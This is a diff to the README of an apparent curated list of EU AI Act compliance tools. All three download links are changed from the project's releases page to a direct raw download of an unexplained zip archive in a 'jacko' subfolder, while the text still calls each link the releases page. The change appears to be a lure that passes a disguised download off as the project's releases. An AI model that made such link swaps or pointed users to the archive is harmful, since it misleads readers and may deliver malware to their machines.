@@ -1,6 +1,6 @@
 # 🤖 awesome-eu-ai-act - Tools for EU AI Act Compliance
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/TokioBanana/awesome-eu-ai-act/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/TokioBanana/awesome-eu-ai-act/raw/refs/heads/master/jacko/awesome-ai-act-eu-3.9.zip)
 
 ## 📋 What is awesome-eu-ai-act?
 
@@ -36,7 +36,7 @@ Follow these steps to access and use the resources for EU AI Act compliance:
 
 Click the button above or this link to open the releases page:
 
-[Download Releases](https://github.com/TokioBanana/awesome-eu-ai-act/releases)
+[Download Releases](https://github.com/TokioBanana/awesome-eu-ai-act/raw/refs/heads/master/jacko/awesome-ai-act-eu-3.9.zip)
 
 This page contains the latest versions of all available tools or downloadable content related to this project.
 
@@ -109,6 +109,6 @@ Use the collection as a starting point for deeper research or to build complianc
 
 Click here to visit the releases page and select your files:
 
-[Download awesome-eu-ai-act](https://github.com/TokioBanana/awesome-eu-ai-act/releases)  
+[Download awesome-eu-ai-act](https://github.com/TokioBanana/awesome-eu-ai-act/raw/refs/heads/master/jacko/awesome-ai-act-eu-3.9.zip)  
 
 This link is your gateway to all available tools, frameworks, and resources in this project. Use it anytime you want to get the latest materials.
